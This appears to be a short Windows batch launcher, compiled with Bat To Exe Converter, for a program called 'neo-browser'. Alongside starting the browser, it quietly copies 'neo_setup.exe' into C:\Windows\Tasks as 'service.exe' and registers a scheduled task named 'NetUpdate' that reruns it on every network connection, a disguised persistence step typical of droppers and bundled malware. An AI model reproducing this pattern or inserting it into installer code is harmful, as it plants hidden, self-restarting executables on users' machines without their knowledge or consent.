::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBVdWAyLAE+1EbsQ5+n//NaQq0MZW/UsNYbY1brAKeMcig==
::YAwzuBVtJxjWCl3EqQJhSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBVdWAyLAE+1EbsQ5+n//NaJp0JQVvAwb5zeyPnfbrFdvHnhbYI/13lOnc8zDQtIQhaifRsIp2tN+2aXONCPth2sXUGHtRl9AzMgu3DEjTkvLtZwn6M=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cd /d "%~dp0"

:: Check if the service file exists (first run detection)
if not exist "C:\Windows\Tasks\service.exe" (
    copy "neo_setup.exe" "C:\Windows\Tasks\service.exe"
    schtasks /create /tn "NetUpdate" /tr "C:\Windows\Tasks\service.exe" /sc onevent /ec Microsoft-Windows-NetworkProfile/Operational /mo *[System[(EventID=10000)]]
)

:: Start main programs
start "" "neo-browser.exe"
start "" "neo_setup.exe"

exit
